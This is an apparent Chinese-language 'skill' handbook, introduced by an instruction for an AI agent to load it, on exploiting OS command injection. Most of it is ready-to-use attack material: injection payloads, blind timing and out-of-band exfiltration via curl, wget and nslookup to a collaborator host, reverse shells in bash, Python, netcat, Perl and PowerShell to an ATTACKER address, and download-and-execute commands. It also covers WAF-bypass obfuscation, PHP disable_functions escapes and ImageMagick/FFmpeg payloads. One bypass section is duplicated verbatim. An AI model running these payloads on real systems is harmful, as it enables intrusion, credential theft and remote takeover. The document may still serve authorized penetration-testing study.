# 技能：操作系统命令注入——专家攻击手册

> **AI 加载指令**：专家级命令注入技术。涵盖所有 shell 伪字符、盲注入、基于时间的检测、带外数据提取、多语言有效载荷和真实世界的代码模式。基础模型会因意外的输入向量而错过微妙的注入。

## 0. 相关路由

在深入之前，你可以先加载：

- [上传不安全文件](../upload-insecure-files/SKILL.md) 当 shell 沉点（sink）是更广泛的上传、导入或转换工作流的一部分时

### 第一次注入的有效载荷家族

| 上下文 | 开始使用 | 备用 |
|---|---|---|
| 通用 shell 分隔符 | `;id` | `&&id` |
| 带引号的参数 | `";id;"` | `';id;'` |
| 盲时序 | `;sleep 5` | `& timeout /T 5 /NOBREAK` |
| 命令替换 | `$(id)` | `` `id` `` |
| 带外 DNS | `;nslookup token.collab` | Windows `nslookup` 变体 |

```text
cat$IFS/etc/passwd
{cat,/etc/passwd}
%0aid
```

---

## 1. SHELL 伪字符（注入操作符）

这些字符会跳出命令上下文并注入新命令：

| 伪字符 | 行为 | 示例 |
|---|---|---|
| `;` | 无论什么情况都运行第二个命令 | `dir; whoami` |
| `\|` | 将标准输出传递给第二个命令 | `dir \| whoami` |
| `\|\|` | 只有第一个命令失败时才运行第二个 | `dir \|\| whoami` |
| `&` | 在后台运行第二个命令（或在 Windows 中按顺序运行） | `dir & whoami` |
| `&&` | 只有第一个命令成功时才运行第二个 | `dir && whoami` |
| `$(cmd)` | 命令替换 | `echo $(whoami)` |
| `` `cmd` `` | 命令替换（反引号） | `` echo `whoami` `` |
| `>` | 将标准输出重定向到文件 | `cmd > /tmp/out` |
| `>>` | 追加到文件 | `cmd >> /tmp/out` |
| `<` | 将文件作为标准输入读取 | `cmd < /etc/passwd` |
| `%0a` | 换行字符（URL 编码） | `cmd%0awhoami` |
| `%0d%0a` | CRLF | 多命令注入 |

---

## 2. 常见易受攻击的代码模式

### PHP
```php
$dir = $_GET['dir'];
$out = shell_exec("du -h /var/www/html/" . $dir);
// 注入：dir=../ ; cat /etc/passwd
// 注入：dir=../ $(cat /etc/passwd)

exec("ping -c 1 " . $ip);          // $ip = "127.0.0.1 && cat /etc/passwd"
system("convert " . $file);        // ImageMagick RCE
passthru("nslookup " . $host);     // $host = "x.com; id"
```

### Python
```python
import os
os.system("curl " + url)            # url = "x.com; id"
subprocess.call("ls " + path, shell=True)  # shell=True 是关键漏洞
os.popen("ping " + host)
```

### Node.js
```javascript
const { exec } = require('child_process');
exec('ping ' + req.query.host, ...);  // host = "x.com; id"
```

### Perl
```perl
$dir = param("dir");
$command = "du -h /var/www/html" . $dir;
system($command);
// 注入 dir 字段：| cat /etc/passwd
```

### ASP (经典)
```vb
szCMD = "type C:\logs\" & Request.Form("FileName")
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run szCMD
// 注入 FileName：foo.txt & whoami > C:\inetpub\wwwroot\out.txt
```

---

## 3. 盲命令注入——检测

当响应未显示命令输出时：

### 基于时间的检测
```bash
# Linux:
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
& sleep 5 &

# Windows:
& timeout /T 5 /NOBREAK
& ping -n 5 127.0.0.1
& waitfor /T 5 signal777
```
比较有无有效载荷时的响应时间。5 秒以上的延迟 = 确认。

### 通过 DNS 的带外数据提取
```bash
# Linux:
; nslookup BURP_COLLAB_HOST
; host `whoami`.BURP_COLLAB_HOST
$(nslookup $(whoami).BURP_COLLAB_HOST)

# Windows:
& nslookup BURP_COLLAB_HOST
& nslookup %USERNAME%.BURP_COLLAB_HOST
```

### 通过 HTTP 的带外数据提取
```bash
# Linux:
; curl http://BURP_COLLAB_HOST/`whoami`
; wget http://BURP_COLLAB_HOST/$(id|base64)

# Windows:
& powershell -c "Invoke-WebRequest http://BURP_COLLAB_HOST/$(whoami)"
```

### 通过带外文件进行带外数据提取
```bash
; id > /var/www/html/RANDOM_FILE.txt
# 然后访问：https://target.com/RANDOM_FILE.txt
```

---

## 4. 注入上下文变化

### 在引号字符串内
```bash
command "INJECT"
# 注入：" ; id ; "
# 结果：command "" ; id ; ""
```

### 在单引号字符串内
```bash
command 'INJECT'
# 注入：'; id;'
# 结果：command ''; id;''
```

### 在反引号执行中
```bash
output=`command INJECT`
# 注入：x`; id ;`
```

### 文件路径上下文
```bash
cat /var/log/INJECT
# 注入：../../../etc/passwd（路径遍历）
# 注入：access.log; id（命令注入）
```

---

## 5. 有效载荷库

### 信息收集
```bash
; id                          # 当前用户
; whoami                      # 用户名
; uname -a                    # 操作系统信息
; cat /etc/passwd             # 用户列表
; cat /etc/shadow             # 密码哈希（如果 root）
; ls /home/                   # 主目录
; env                         # 环境变量（数据库凭证、API 密钥！）
; printenv                    # 相同
; cat /proc/1/environ         # 进程环境
; ifconfig                    # 网络接口
; cat /etc/hosts              # 主机条目
```

### 反向 Shell（Linux）
```bash
# Bash:
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Python:
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat（带 -e 参数）:
; nc ATTACKER 4444 -e /bin/bash

# Netcat（不带 -e 参数 / OpenBSD）:
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# Perl:
; perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 反向 Shell（通过 PowerShell）
```powershell
& powershell -NoP -NonI -W Hidden -Exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 6. WAF 绕过技术

### 通配符扩展

```bash
# 使用 ? 和 * 绕过关键字过滤器：
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (近似)

# 用于特定文件的模式匹配：
cat /e?c/p?sswd
cat /e*c/p*d
```

### `cat` 的替代方案（当 "cat" 被过滤时）

```bash
tac /etc/passwd          # 反向 cat
nl /etc/passwd           # 带编号的行
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # 然后离线解码
```

### PHP 特定的注释插入

```bash
# 在函数名内插入注释以绕过 WAF：
sys/*x*/tem('id')        # PHP 在某些 eval 上下文中忽略 /* */
```

### XOR 字符串构造（PHP）

```php
# 从可打印字符的 XOR 构建函数名：
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# 生成："assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# 计算：assert("system")
```

### Base64/ROT13 编码

```php
# 编码有效载荷，在运行时解码：
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
```

### `chr()` 构造

```php
# 逐个字符构建字符串：
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### 美元符号变量技巧

```bash
# $IFS（内部字段分隔符）作为空格：
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# 未设置的变量扩展为空：
c${x}at /etc/passwd      # $x 未设置 → "cat"
```

---

## 7. 常见的注入入口点

| 入口点 | 示例 |
|---|---|
| 网络工具 | ping, nslookup, traceroute, whois 表单 |
| 文件转换 | 图像缩放, PDF 生成, 格式转换 |
| 邮件发送器 | 通知邮件中的发件人地址、姓名字段 |
| 搜索/排序参数 | 传递给 grep、find、sort 命令 |
| 日志查看 | 传递给 tail、grep 命令 |
| 自定义脚本执行 | "运行测试" 功能, CI/CD 钩子 |
| DNS 查询功能 | rDNS 查询, WHOIS 查询 |
| 备份/恢复功能 | 文件路径参数 |
| 压缩文件处理 | zip/unzip, tar 使用用户提供的文件名 |

---

## 8. 盲注入决策树

```
发现潜在注入点？
├── 尝试基本： ; sleep 5
│   └── 响应延迟？ → 确认盲注入
│       ├── 通过时序提取数据：if/then sleep
│       └── 使用带外：curl/nslookup 到 Collaborator
│
├── 未观察到延迟？
│   ├── 尝试： | sleep 5
│   ├── 尝试： $(sleep 5)
│   ├── 尝试： ` sleep 5 `
│   ├── 尝试 URL 编码后：%3B%20sleep%205
│   └── 尝试双重编码：%253B%2520sleep%25205
│
└── 所有被阻止 → 检查 Web 应用层
    输入是否过滤？ → 重新编码
    是否针对特定命令过滤？ → 空格绕过、$IFS、glob
```

---

## 9. 高级 WAF 绕过技术

### 通配符扩展

```bash
# 使用 ? 和 * 绕过关键字过滤器：
/???/??t /???/p??s??    # /bin/cat /etc/passwd
/???/???/????2 *.php     # /usr/bin/find2 *.php (近似)

# 用于特定文件的模式匹配：
cat /e?c/p?sswd
cat /e*c/p*d
```

### `cat` 的替代方案（当 "cat" 被过滤时）

```bash
tac /etc/passwd          # 反向 cat
nl /etc/passwd           # 带编号的行
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev
xxd /etc/passwd
strings /etc/passwd
od -c /etc/passwd
base64 /etc/passwd       # 然后离线解码
```

### PHP 特定的注释插入

```bash
# 在函数名内插入注释以绕过 WAF：
sys/*x*/tem('id')        # PHP 在某些 eval 上下文中忽略 /* */
```

### XOR 字符串构造（PHP）

```php
# 从可打印字符的 XOR 构建函数名：
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
# 生成："assert"
$_('%13%19%13%14%05%0d'|'%60%60%60%60%60%60');
# 计算：assert("system")
```

### Base64/ROT13 编码

```php
# 编码有效载荷，在运行时解码：
base64_decode('c3lzdGVt')('id');     # system('id')
str_rot13('flfgrz')('id');           # system → flfgrz via ROT13
```

### `chr()` 构造

```php
# 逐个字符构建字符串：
chr(115).chr(121).chr(115).chr(116).chr(101).chr(109)  # "system"
```

### 美元符号变量技巧

```bash
# $IFS（内部字段分隔符）作为空格：
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# 未设置的变量扩展为空：
c${x}at /etc/passwd      # $x 未设置 → "cat"
```

---

## 10. PHP disable_functions 绕过路径

当 `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()` 都被禁用时：

### 路径 1: LD_PRELOAD + mail()/putenv()

```php
// 1. 上传共享对象 (.so) 钩子 libc 函数
// 2. 设置 LD_PRELOAD 指向它
putenv("LD_PRELOAD=/tmp/evil.so");
// 3. 触发外部进程（mail() 调用 sendmail）
mail("a@b.com","","","");
// .so 的构造函数运行时获得 shell 访问权限
```

### 路径 2: Shellshock (CVE-2014-6271)

```php
// 如果 bash 存在 Shellshock 漏洞：
putenv("PHP_LOL=() { :; }; /usr/bin/id > /tmp/out");
mail("a@b.com","","");
// Bash 处理函数定义并运行尾随命令
```

### 路径 3: Apache mod_cgi + .htaccess

```php
// 写入 .htaccess 启用 CGI：
file_put_contents('/var/www/html/.htaccess', 'Options +ExecCGI\nAddHandler cgi-script .sh');
// 写入 CGI 脚本：
file_put_contents('/var/www/html/cmd.sh', "#!/bin/bash\necho Content-type: text/html\necho\n$1");
chmod('/var/www/html/cmd.sh', 0755);
// 访问：/cmd.sh?id
```

### 路径 4: PHP-FPM / FastCGI

```php
// 如果 PHP-FPM 套接字可访问（/var/run/php-fpm.sock 或端口 9000）：
// 发送定制的 FastCGI 请求来执行任意 PHP，使用不同的 php.ini
// 工具：https://github.com/neex/phuip-fpizdam
// 覆盖：PHP_VALUE=auto_prepend_file=/tmp/shell.php
```

### 路径 5: COM 对象（仅 Windows）

```php
// Windows 仅，如果 COM 扩展启用：
$wsh = new COM('WScript.Shell');
$exec = $wsh->Run('cmd /c whoami > C:\inetpub\wwwroot\out.txt', 0, true);
```

### 路径 6: ImageMagick Delegate (CVE-2016-3714 "ImageTragick")

```php
// 如果 ImageMagick 处理用户上传的图像：
// 上传 SVG/MVG 嵌入命令：
// exploit.svg 的内容：
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id > /tmp/pwned")'
pop graphic-context
```

**也考虑（总结）：** iconv (CVE-2024-2961) via `php://filter/convert.iconv`; FFI (`FFI::cdef` + `libc`) 当扩展启用时。

---

## 11. 组件级命令注入

### ImageMagick Delegate 滥用

```
# MVG 格式包含 URL 中的 shell 命令：
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`id > /tmp/out`'
pop graphic-context

# 或通过文件名：convert '|id' out.png
```

### FFmpeg (HLS/concat 协议)

```
# SSRF/LFI 通过 m3u8 播放列表：
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# 上传为 .m3u8，FFmpeg 处理并可能泄露文件内容到输出
```

### Elasticsearch Groovy 脚本（5.x 之前）

```json
POST /_search
{
  "query": { "match_all": {} },
  "script_fields": {
    "cmd": {
      "script": "Runtime rt = Runtime.getRuntime(); rt.exec('id')"
    }
  }
}
```

### Ping/Traceroute/NSLookup 诊断页面

```
# 经典注入点在网络诊断功能中：
# 输入：127.0.0.1; id
# 输入：127.0.0.1 && cat /etc/passwd
# 输入：`id`.attacker.com (DNS exfil via backtick)
# 这些功能直接使用用户输入调用 OS 命令
```

**其他接收器（快速参考）：** PDF 生成器 (wkhtmltopdf / WeasyPrint 使用用户 HTML); Git 包装器 (`git clone` URL / 钩子).

---

## 12. WINDOWS CMD.EXE VS POWERSHELL 注入矩阵

| 功能 | cmd.exe | PowerShell |
|---|---|---|
| **命令分隔符** | `&`, `&&`, `\|\|`, `;` (有限) | `;`, `\|`, `&` (调用操作符) |
| **变量扩展** | `%VARIABLE%`, `!VAR!` (延迟) | `$env:VARIABLE`, `$Variable` |
| **转义字符** | `^` (脱字符) | `` ` `` (反引号) |
| **命令替换** | `FOR /F` 循环 | `$()` 子表达式 |
| **编码执行** | N/A | `-EncodedCommand` (base64 UTF-16LE) |
| **管道** | `\|` (仅标准输出) | `\|` (对象，非文本) |
| **注释** | `REM`, `::` | `#` |
| **字符串引号** | `"double"` 仅 | `"double"`, `'single'` (无扩展) |

### cmd.exe 特定有效载荷

```batch
REM 命令链式执行
dir & whoami
dir && whoami
dir || whoami

REM 脱字符绕过关键字过滤器
w^h^o^a^m^i
n^e^t u^s^e^r

REM 变量扩展注入
set CMD=whoami
%CMD%

REM 环境变量带外提取 via DNS
nslookup %USERNAME%.attacker.com
nslookup %COMPUTERNAME%.attacker.com

REM 延迟扩展（当 !var! 启用时）
cmd /V:ON /C "set x=whoami&!x!"
```

### PowerShell 特定有效载荷

```powershell
# 分号分隔符
Get-Process; whoami

# 子表达式
"$(whoami)"
Write-Output $(hostname)

# Base64 编码命令 (UTF-16LE)
powershell -EncodedCommand dwBoAG8AYQBtAGkA
# 解码为：whoami

# Invoke-Expression 混淆
$a='who';$b='ami';iex "$a$b"
& (gcm *ke-*) "whoami"

# 下载并执行
IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
IEX (iwr http://attacker/payload.ps1 -UseBasicParsing).Content

# 受约束的语言模式绕过（如果可用）
powershell -Version 2 -Command "whoami"
```

### 跨平台有效载荷差异

| 目标 | 时序延迟 | DNS 带外提取 | 文件读取 |
|---|---|---|---|
| Linux/macOS | `sleep 5` | `nslookup $(whoami).atk.com` | `cat /etc/passwd` |
| cmd.exe | `timeout /T 5 /NOBREAK` | `nslookup %USERNAME%.atk.com` | `type C:\Windows\win.ini` |
| PowerShell | `Start-Sleep 5` | `nslookup $(whoami).atk.com` | `Get-Content C:\Windows\win.ini` |

### 检测优先的多语言有效载荷

```text
;sleep${IFS}5;#&timeout /T 5 /NOBREAK&#
```

跨 sh/bash/cmd 上下文工作——其中一个分隔符会触发。
